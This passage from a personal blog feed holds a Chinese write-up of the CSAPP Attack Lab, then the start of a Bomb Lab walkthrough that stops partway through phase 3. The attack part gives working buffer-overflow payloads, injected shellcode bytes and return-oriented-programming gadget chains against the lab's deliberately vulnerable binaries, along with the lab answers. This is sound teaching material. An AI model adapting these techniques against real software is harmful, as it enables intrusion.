$0x28,%rsp</code>，可以看到函数 <code>getbuf</code> 的栈帧大小为 40 字节。因此要对返回地址进行写入修改，我们可以先写入 40 字节的任意数据，然后再写入 8 字节的目标地址。</p><blockquote><p>这里的“任意”并非真的任意，因为最终的输入是通过字符串的形式来完成的，因此有些特定的字符可能会导致异常，例如 ‘\n’（对应 ASCII 码为 0x0a），这里我选用的 0x3f（向灵神致敬😄）。</p></blockquote><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fc0 17 40 00 00 00 00 00  &#x2F;&#x2F; 目标地址</code></pre><p>可以借助 <code>hex2raw</code> 工具将 16 进制转换为对应的字符串，再管道给 <code>ctarget</code> 即可。</p><pre class="language-shell" data-language="shell"><code class="language-shell">cat phase_1.txt | .&#x2F;hex2raw | .&#x2F;ctarget -q</code></pre><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><p>phase_2 相较于相较于 phase_1，由于要验证参数的正确性，因此只是跳转到目标程序位置还不够，还需要设置参数的值。但原始程序中并没有相关的代码，那参数的值应该如何设置？</p><p>这里必须要有一个理念：站在存储的角度，程序与数据并没有区别，它们都是由 0 和 1 组成的比特流。因此，设置参数的代码我们可以自行编写，将其当作数据进行传入，这样的操作称之为 <strong>代码注入(code injection)</strong> 。最后将我们编写的程序的地址作为返回地址，这样，当程序从 <code>getbuf</code> 返回时，就会跳转到我们先前注入的代码，从而达成目的。</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">touch2</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> val<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    vlevel <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">/* Part of validation protocol */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>val <span class="token operator">==</span> cookie<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Touch2!: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">validate</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Misfire: You called touch2(0x%.8x)\n"</span><span class="token punctuation">,</span> val<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">fail</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>一种有效的注入代码完成的操作如下：</p><ol><li>写入寄存器 <code>%rdi</code> 的值，使其等于 cookie.</li><li>跳转到程序 <code>touch2</code> 处。</li></ol><p>关于跳转，实验手册中推荐使用 <code>ret</code> 指令，它可看作是两个步骤的综合：首先从栈中弹出地址 A，然后将 PC 值设置为 A。因此想要跳转到 <code>touch2</code>，可以先使用 <code>push</code> 将 <code>touch2</code> 的地址压入栈中，然后使用 <code>ret</code> 实现跳转。</p><p>对于指令的二进制表示，可以先编译： <code>gcc -c ./injec.s</code>，再反汇编：<code>objdump -d ./injec.o</code> 得到。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 8b 3c 25 e4 44 60    mov    0x6044e4,%rdi   7:   00    8:   68 ec 17 40 00          pushq  $0x4017ec   d:   c3                      retq</code></pre><p>另外，要想跳转到注入代码的位置，我们必须首先知道它的地址，由于 ctarget 没有使用 <strong>栈随机化（stack randomization）</strong> ，因此我们完全可以先借助 GDB 打印出调用 <code>Gets</code> 前的栈指针值，再根据注入代码相较于栈指针的偏移计算得到。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-1.png" alt></p><p>最终的攻击数据如下所示：</p><pre class="language-none"><code class="language-none">48 8b 3c 25 e4 44 60 0068 ec 17 40 00 c3 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>最后，想吐槽一点，Attack Lab 貌似没法 GDB 调试 <code>getbuf</code> ？没了调试，在一些简单的错误上面卡半天。。。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p2-2.png" alt></p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><p>phase_3 和 phase_2 很类似，只不过参数由整数换成了字符串，不过思路都是大抵相同的。</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">void touch3(char *sval)&#123;    vlevel &#x3D; 3; &#x2F;* Part of validation protocol *&#x2F;    if (hexmatch(cookie, sval)) &#123;    printf(&quot;Touch3!: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    validate(3);    &#125; else &#123;    printf(&quot;Misfire: You called touch3(\&quot;%s\&quot;)\n&quot;, sval);    fail(3);    &#125;    exit(0);&#125;&#x2F;* Compare string to hex represention of unsigned value *&#x2F;int hexmatch(unsigned val, char *sval)&#123;    char cbuf[110];    &#x2F;* Make position of check string unpredictable *&#x2F;    char *s &#x3D; cbuf + random() % 100;    sprintf(s, &quot;%.8x&quot;, val);    return strncmp(sval, s, 9) &#x3D;&#x3D; 0;&#125;</code></pre><p>字符串相较于整数，无外乎多了一层 <strong>indirection</strong> ，也就是指针。我们只需要预先在某个地址 addr 处将字符串数据进行存储，后续将字符串参数设置为 addr 即可，同样，addr 的值可根据相对于栈的偏移量得到。</p><p>注入的代码如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">Disassembly of section .text:0000000000000000 &lt;.text&gt;:   0:   48 c7 c7 88 dc 61 55    mov    $0x5561dc88,%rdi   7:   68 fa 18 40 00          pushq  $0x4018fa   c:   c3                      retq </code></pre><p>而字符串 <code>&quot;59b997fa&quot;</code> 的 ASCII 码表示为：<code>35 39 62 39 39 37 66 61 00</code>，最后的 <code>00</code> 表示 NULL，即 C 语言字符串的终结符。</p><p>这里我遇到了一点问题，这是错误的攻击数据：</p><pre class="language-none"><code class="language-none">48 c7 c7 88 dc 61 55 68fa 18 40 00 c3 00 00 00 35 39 62 39 39 37 66 6100 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 00</code></pre><p>上面的答案看似没有问题，但是实际上忽略了很重要的一点，字符串的值存放在 <code>getbuf</code> 的栈帧中（<code>0x5561dc78 ~ 0x5561dc98</code>），在完成字符串正确性检验之前，字符串的值都应该 <strong>保持不变</strong> 。而实际上在函数 <code>getbuf</code> 返回后，它的栈帧空间将会被回收，留给 <code>touch3</code> 和 <code>hexmatch</code> 分配使用，且观察反汇编代码发现分配给 <code>hexmatch</code> 的栈帧空间大于 40 字节，这必然导致 <code>getbuf</code> 栈帧数据被破坏，也就导致了错误。 </p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-1.png" alt></p><p>一种正确的方式是将字符串数据写入 <code>test</code> 栈帧或更高地址处，因为实验只要求成功触发 touch，而并不要求正确返回到之前的调用过程，因此破坏之前的栈帧对结果无影响。</p><pre class="language-none"><code class="language-none">48 c7 c7 a8 dc 61 55 68fa 18 40 00 c3 00 00 003f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f78 dc 61 55 00 00 00 0035 39 62 39 39 37 66 6100</code></pre><p><img src="/2024/09/25/CSAPP-Attack-Lab/p3-2.png" alt></p><h1 id="phase-4"><a href="#phase-4" class="headerlink" title="phase_4"></a>phase_4</h1><p>后面的两个实验需要攻击程序是 rtarget，相较于 ctarget，它引入了很多安全措施，例如栈随机化、限制可执行代码区域等，因此攻击起来更为困难。</p><p>参考实验手册，其中介绍了一种很有意思的攻击方法：不手动注入代码，而是借助已存在的代码，将其重组为我们需要的攻击代码。其中，一个以 <code>ret</code> 指令结束的指令序列，称之为一个 gadget，一连串的 gadget 被调用将会产生等价于代码注入的效果。</p><p><img src="/2024/09/25/CSAPP-Attack-Lab/p4-1.png" alt></p><p>想法很美好，但是实施起来的过程还是比较痛苦的，要想组合出有效的 gadget，需要仔细对照指令的字节表示和 <code>farm</code> 的反汇编代码，这部分我也是大量 <del>抄袭了</del> 参考了其他人的做法。</p><p>一种正确的 gadget 组合如下：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019c5 &lt;setval_426 + 2&gt;:48 89 c7  movq %rax,%rdi90        nopc3  ret</code></pre><p>返回地址为 <code>0x4019ab</code>，即 gadget1 的起始地址，然后栈中从低到高依次存放：cookie 的值、gadget2 的起始地址、<code>touch2</code> 的起始地址。 </p><blockquote><p>这里要注意出栈是从低地址向高地址方向，与入栈相反。</p></blockquote><p>最终的攻击数据如下：</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 00fa 97 b9 59 00 00 00 00c5 19 40 00 00 00 00 00ec 17 40 00 00 00 00 00</code></pre><h1 id="phase-5"><a href="#phase-5" class="headerlink" title="phase_5"></a>phase_5</h1><p>最后 phase_5 的 gadget 构造非常复杂（官解是用了 8 个），在 CMU 的实验中也是属于选做的部分，完成前四个已经有 95 分了，因此这里也只介绍一些问题和思路。</p><p>前面提到，rtarget 引入了栈随机化，这会带来的问题是：在指定参数 sval 时，无法显式地指定地址，而需要依靠间接寻址，即栈指针 <code>%rsp</code> 加上一个相较于它的偏移量。我们可以先确定哪条指令根据栈指针的值计算字符串参数，记录下它的位置和字符串存放位置的偏移量，作为数据一并存入栈中，后续再取出进行计算。</p><p>以下是一种正确的 gadget 实现：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly"># gadget100000000004019ab &lt;addval_219 + 4&gt;:58  pop %rax90  nopc3  ret# gadget200000000004019dd &lt;getval_481 + 2&gt;:89 c2   movl %eax,%edx90nopc3ret# gadget30000000000401a69 &lt;getval_481 + 1&gt;:89 d1   movl %edx,%ecx08 dborb  %bl,%blc3ret# gadget40000000000401a13 &lt;addval_436 + 2&gt;:89 ce   movl %ecx,%esi90nop90nopc3ret# gadget50000000000401aad &lt;setval_350 + 2&gt;:48 89 e0  movq %rsp,%rax90  nopc3  ret# gadget600000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret# gadget700000000004019d6 &lt;add_xy&gt;:48 8d 04 37  lea  (%rdi,%rsi,1),%raxc3 ret# gadget800000000004019a2 &lt;addval_273 + 2&gt;:48 89 c7  movq %rax,%rdic3  ret</code></pre><p>攻击数据的构造和 phase_4 很类似，就不过多赘述了。</p><pre class="language-none"><code class="language-none">3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3f3f 3f 3f 3f 3f 3f 3f 3fab 19 40 00 00 00 00 0020 00 00 00 00 00 00 00dd 19 40 00 00 00 00 0069 1a 40 00 00 00 00 0013 1a 40 00 00 00 00 00ad 1a 40 00 00 00 00 00a2 19 40 00 00 00 00 00d6 19 40 00 00 00 00 00a2 19 40 00 00 00 00 00fa 18 40 00 00 00 00 0035 39 62 39 39 37 66 6100</code></pre>]]></content>
    
    
    <summary type="html">&lt;p&gt;个人感觉非常有意思的一个 Lab，涉及的知识面比较窄，主要关注 &lt;strong&gt;缓冲区溢出漏洞&lt;/strong&gt; 这一个方面，并基于此进行代码攻击，体验一把做黑客的感觉，对应知识点为书中的 3.10 节内容。&lt;/p&gt;</summary>
    
    
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="计算机基础" scheme="http://lordaeronesz.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%9F%BA%E7%A1%80/"/>
    
    <category term="汇编语言" scheme="http://lordaeronesz.github.io/tags/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab</title>
    <link href="http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/"/>
    <id>http://lordaeronesz.github.io/2024/09/17/CSAPP-Bomb-Lab/</id>
    <published>2024-09-17T03:45:11.000Z</published>
    <updated>2024-09-19T06:46:56.785Z</updated>
    
    <content type="html"><![CDATA[<span id="more"></span><p>本 Lab 可以说是 CSAPP 的几个 Lab 中最为人津津乐道的一个，对应知识点为书中的第 3 章（程序的机器级表示），要求使用 GDB 调试器，对汇编语言进行调试，从而得出正确的“拆弹密码”。共分为 6 个关卡和一个隐藏关卡，每个关卡都分别考察了一种语法结构或数据结构的汇编表示，部分关卡逻辑比较复杂，要求对 x86 汇编有一定的熟悉度。</p><h1 id="bomb-c"><a href="#bomb-c" class="headerlink" title="bomb.c"></a>bomb.c</h1><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">char</span> <span class="token operator">*</span>input<span class="token punctuation">;</span>    <span class="token comment">/* Note to self: remember to port this bomb to Windows and put a     * fantastic GUI on it. */</span>    <span class="token comment">/* When run with no arguments, the bomb reads its input lines     * from standard input. */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        infile <span class="token operator">=</span> <span class="token constant">stdin</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* When run with one argument &lt;file>, the bomb reads from &lt;file>     * until EOF, and then switches to standard input. Thus, as you     * defuse each phase, you can add its defusing string to &lt;file> and     * avoid having to retype it. */</span>    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>argc <span class="token operator">==</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>infile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s: Error: Couldn't open %s\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* You can't call the bomb with more than 1 command line argument. */</span>    <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Usage: %s [&lt;input_file>]\n"</span><span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Do all sorts of secret stuff that makes the bomb harder to defuse. */</span>    <span class="token function">initialize_bomb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Welcome to my fiendish little bomb. You have 6 phases with\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"which to blow yourself up. Have a nice day!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Hmm...  Six phases must be more secure than one phase! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token comment">/* Get input                   */</span>    <span class="token function">phase_1</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>                  <span class="token comment">/* Run the phase               */</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token comment">/* Drat!  They figured it out!                                      * Let me know how they did it. */</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Phase 1 defused. How about the next one?\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* The second phase is harder.  No one will ever figure out     * how to defuse this... */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_2</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"That's number 2.  Keep going!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* I guess this is too easy so far.  Some more complex code will     * confuse people. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_3</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Halfway there!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Oh yeah?  Well, how good is your math?  Try on this saucy problem! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_4</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So you got that one.  Try this one.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Round and 'round in memory we go, where we stop, the bomb blows! */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_5</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Good work!  On to the next...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* This phase will never be used, since no one will get past the     * earlier ones.  But just in case, make this one extra hard. */</span>    input <span class="token operator">=</span> <span class="token function">read_line</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_6</span><span class="token punctuation">(</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">phase_defused</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">/* Wow, they got it!  But isn't something... missing?  Perhaps     * something they overlooked?  Mua ha ha ha ha! */</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>首先观察 <code>bomb.c</code> 的 main 函数结构，最开始判断 argc 是否为 1，如果为 1，表示运行 bomb 程序时没有指定命令行参数，即从标准输入中读取 “拆弹密码”；否则，从指定的文件中读取。为了后续调试的方便，可以将所有的密码写入一个文件 <code>ans.txt</code> 中，后续在启动 bomb 程序时对其指定：<code>./bomb ans.txt</code>.</p><p>随后便是初始化“炸弹”，每次读取一行密码，利用该密码进行“拆弹”，如果正确，则进入下一关卡，否则，“炸弹”就会爆炸，“拆弹”失败。一次性输对 6 个密码后，“炸弹”就会被“拆除”。</p><p>注意最后的注释：</p><blockquote><p>Wow, they got it!  But isn’t something… missing?  Perhaps something they overlooked?  Mua ha ha ha ha!</p></blockquote><p>一定程度上暗示了隐藏关卡的存在。</p><h1 id="phase-1"><a href="#phase-1" class="headerlink" title="phase_1"></a>phase_1</h1><p>每次拆弹时，可以使用 <code>disas</code> 命令进行反汇编，查看函数对应的汇编代码，以下是 <code>disas phase_1</code> 的结果：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi0x0000000000400ee9 &lt;+9&gt;:     call   0x401338 &lt;strings_not_equal&gt;0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;0x0000000000400ef2 &lt;+18&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp0x0000000000400efb &lt;+27&gt;:    ret</code></pre><p>热身关卡，代码的逻辑很简单，读取一行密码，判断该密码与事先指定的字符串是否相同，如果不相同，则“引爆炸弹”。</p><p>这里需要熟悉 x86 寄存器的使用惯例（也可以 GDB 自行调试），寄存器 <code>%rdi</code> 寄存器 <code>%rsi</code> 分别作为函数调用时的参数 1 和参数 2。在这里，<code>%rdi</code> 存储着读取到的密码字符串（准确来说，是字符串首字母的地址），而 <code>%rsi</code> 则被赋值为 <code>0x402400</code>，然后，将这两个地址作为参数 1 和参数 2，调用 <code>string_not_equal</code>，从函数名称上看，该函数用来判定两个字符串是否相同。那么思路就很清晰了，密码就是地址 <code>0x402400</code> 处的字符串值，使用 <code>x/s 0x402400</code> 查看即可。</p><p><img src="/2024/09/17/CSAPP-Bomb-Lab/p1.png" alt></p><h1 id="phase-2"><a href="#phase-2" class="headerlink" title="phase_2"></a>phase_2</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400efc &lt;+0&gt;:     push   %rbp0x0000000000400efd &lt;+1&gt;:     push   %rbx0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi0x0000000000400f05 &lt;+9&gt;:     call   0x40145c &lt;read_six_numbers&gt;0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;0x0000000000400f10 &lt;+20&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;0x0000000000400f20 &lt;+36&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp0x0000000000400f40 &lt;+68&gt;:    pop    %rbx0x0000000000400f41 &lt;+69&gt;:    pop    %rbp0x0000000000400f42 &lt;+70&gt;:    ret</code></pre><p>这一关主要是考察 <strong>循环语句</strong> ，可以仔细阅读书中第 3.6.7 节，加强对汇编的循环结构的熟悉程度，如果感觉思路很乱，可以采用与书中类似的方法：先将汇编翻译为等价的带 goto 的高级语言，再参考几种典型的循环形式，将 goto 改写为循环结构，以下便是最终翻译得到的类 C 语言伪代码：</p><pre class="language-pseudocode" data-language="pseudocode"><code class="language-pseudocode">read_six_numbers();if (Mem[%rsp] !&#x3D; 1) &#123;    explode_bomb();&#125;for (%rbx &#x3D; %rsp + 4, %rbp &#x3D; %rsp + 24; %rbx !&#x3D; %rbp; %rbx +&#x3D; 4) &#123;    %eax &#x3D; Mem[%rbx - 4];  &#x2F;&#x2F; 上一个元素    %eax *&#x3D; 2;    if (Mem[%rbx] !&#x3D; %eax) &#123;        explode_bomb();    &#125;&#125;</code></pre><p>首先注意到 <code>read_six_numbers()</code> 函数，字面意思是读取 6 个数字，推测密码由 6 个数字组成。</p><p>然后判断 <code>Mem[%rsp]</code> 的值是否为 1，不是则“爆炸”。这里可以善用 GDB，先随便蒙 6 个数字，然后使用 <code>p/x</code> 打印 <code>Mem[%rsp]</code> 的值，发现其值正好等于输入的第一个数字，结合后面的 6 次循环可知，输入的第 i （i 从 0 开始）个数字存储在地址 <code>%rsp + 4 * i</code> 处，且每个数字都必须为它前一个数字的两倍。</p><p>那么代码逻辑便理清楚了：输入的第一个数字为 1，其后每一个数字都为前一个数字的两倍，密码为：<code>1 2 4 8 16 32</code>.</p><h1 id="phase-3"><a href="#phase-3" class="headerlink" title="phase_3"></a>phase_3</h1><pre class="language-assembly" data-language="assembly"><code class="language-assembly">0x0000000000400f43 &lt;+0&gt;:     sub    $0x18,%rsp0x0000000000400f47 &lt;+4&gt;:     lea    0xc(%rsp),%rcx0x0000000000400f4c &lt;+9&gt;:     lea    0x8(%rsp),%rdx0x0000000000400f51 &lt;+14&gt;:    mov    $0x4025cf,%esi0x0000000000400f56 &lt;+19&gt;:    mov    $0x0,%eax0x0000000000400f5b &lt;+24&gt;:    call   0x400bf0 &lt;__isoc99_sscanf@plt&gt;0x0000000000400f60 &lt;+29&gt;:    cmp    $0x1,%eax0x0000000000400f63 &lt;+32&gt;:    jg     0x400f6a &lt;phase_3+39&gt;0x0000000000400f65 &lt;+34&gt;:    call   0x40143a &lt;explode_bomb&gt;0x0000000000400f6a &lt;+39&gt;:    cmpl   $0x7,0x8(%rsp)0x0000000000400f6f &lt;+44&gt;:    ja     0x400fad &lt;phase_3+106&gt;0x0000000000400f71 &lt;+46&gt;:    mov    0x8(%rsp),%eax0x0000000000400f75 &lt;+50&gt;:    jmp    *0x402470(,%rax,8)0x0000000000400f7c &lt;+57&gt;:    mov    $0xcf,%eax0x0000000000400f81 &lt;+62&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f83 &lt;+64&gt;:    mov    $0x2c3,%eax0x0000000000400f88 &lt;+69&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f8a &lt;+71&gt;:    mov    $0x100,%eax0x0000000000400f8f &lt;+76&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f91 &lt;+78&gt;:    mov    $0x185,%eax0x0000000000400f96 &lt;+83&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f98 &lt;+85&gt;:    mov    $0xce,%eax0x0000000000400f9d &lt;+90&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400f9f &lt;+92&gt;:    mov    $0x2aa,%eax0x0000000000400fa4 &lt;+97&gt;:    jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fa6 &lt;+99&gt;:    mov    $0x147,%eax0x0000000000400fab &lt;+104&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fad &lt;+106&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fb2 &lt;+111&gt;:   mov    $0x0,%eax0x0000000000400fb7 &lt;+116&gt;:   jmp    0x400fbe &lt;phase_3+123&gt;0x0000000000400fb9 &lt;+118&gt;:   mov    $0x137,%eax0x0000000000400fbe &lt;+123&gt;:   cmp    0xc(%rsp),%eax0x0000000000400fc2 &lt;+127&gt;:   je     0x400fc9 &lt;phase_3+134&gt;0x0000000000400fc4 &lt;+129&gt;:   call   0x40143a &lt;explode_bomb&gt;0x0000000000400fc9 &lt;+134&gt;:   add    $0x18,%rsp0x0000000000400fcd &lt;+138&gt;:   